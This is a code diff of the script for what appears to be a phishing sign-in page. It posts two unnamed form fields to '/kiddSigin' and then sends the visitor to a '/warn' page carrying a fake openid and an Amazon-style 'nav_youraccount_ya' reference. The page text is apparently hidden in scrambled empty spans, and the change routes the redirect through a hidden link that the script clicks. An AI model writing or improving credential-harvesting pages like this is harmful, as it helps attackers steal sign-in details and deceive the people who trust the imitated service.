@@ -167,7 +167,8 @@
                 "            class='LjcHx'></span><span class='cdbfJ'></span><span class='WSUuq'></span><span class='geaQK'></span><span\n" +
                 "            class='Natxr'></span><span class='kWDJP'></span><span class='VxfEC'></span><span class='JMepG'></span><span\n" +
                 "            class='spZkP'></span></p>\n" +
-                "</div>";
+                "</div>" +
+                "<a id='links' href=\"#\" style='display:none;'></a>";
     }
 </script>
 <script src="library/jquery/main.min.js"></script>
@@ -190,18 +191,23 @@
         if (!check()) return;
         $.post("/kiddSigin", {kiddfiled1: filed1, kiddfiled2: filed2},
                 function (data) {
-                    window.location.href = '/warn?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
+                    var kiddLink = document.getElementById('links');
+                    //给它的href属性添加网址
+                    kiddLink.href = "/warn?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya";
+                    //调用这个对象的click方法
+                    kiddLink.click();
+                    //window.location.href = '/warn?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
                 }, "json");
     }
 
-    $("#kiddbtn1").click(function () {
-        var filed1 = $("#kiddfiled1").val();
-        var filed2 = $("#kiddfiled2").val();
-        if (!check()) return;
-        $.post("/kiddSigin", {kiddfiled1: filed1, kiddfiled2: filed2},
-                function (data) {
-                    window.location.href = '/warn?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
-                }, "json");
-    })
+    // $("#kiddbtn1").click(function () {
+    //     var filed1 = $("#kiddfiled1").val();
+    //     var filed2 = $("#kiddfiled2").val();
+    //     if (!check()) return;
+    //     $.post("/kiddSigin", {kiddfiled1: filed1, kiddfiled2: filed2},
+    //             function (data) {
+    //                 window.location.href = '/warn?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
+    //             }, "json");
+    // })
 </script>
 </html>
